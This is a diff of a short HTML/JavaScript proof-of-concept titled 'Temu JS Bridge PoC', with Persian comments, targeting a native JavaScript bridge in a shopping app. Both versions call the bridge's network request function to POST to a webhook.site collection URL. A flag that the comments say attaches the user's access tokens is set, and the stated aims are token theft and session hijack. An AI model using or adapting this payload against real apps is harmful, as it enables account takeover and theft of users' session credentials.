@@ -1,23 +1,27 @@
-// payload.html
-(function() {
-    const WEBHOOK_URL = "https://webhook.site/#!/view/242315a0-d215-442c-b84b-dd31669e5904; // آدرس خودت را اینجا بذار
+<!DOCTYPE html>
+<html>
+<head><title>Temu JS Bridge PoC</title></head>
+<body>
+<script>
+  console.log("=== Temu JS Bridge Payload v2 Loaded ===");
+  const bridge = window.__tm_android_bridge;
 
-    if (window.__tm_android_bridge) {
-        // مرحله ۱: سرقت AccessToken و ETag
-        window.__tm_android_bridge.callNative(
-            "TMNetwork",
-            "request",
-            JSON.stringify({
-                url: WEBHOOK_URL,
-                method: "POST",
-                isApiRequest: true, // این پارامتر جادویی توکن‌ها را به هدر اضافه می‌کند
-                data: JSON.stringify({ info: "Token Leak Successful" }),
-                encode_resp: false
-            }),
-            Date.now()
-        );
-        alert("Exploit Triggered! Check Webhook.");
-    } else {
-        document.write("Bridge not found yet...");
-    }
-})();
+  if (!bridge) {
+    console.log("❌ Bridge not found!");
+  } else {
+    console.log("✅ Bridge found!");
+
+    // تست Session Hijack
+    bridge.callNative("TMNetwork", "request", JSON.stringify({
+      url: "https://webhook.site/#!/view/242315a0-d215-442c-b84b-dd31669e5904",
+      method: "POST",
+      isApiRequest: true,
+      data: JSON.stringify({ stage: "jsbridge_ato" }),
+      encode_resp: false
+    }), Date.now());
+
+    console.log("Session Hijack request sent.");
+  }
+</script>
+</body>
+</html>
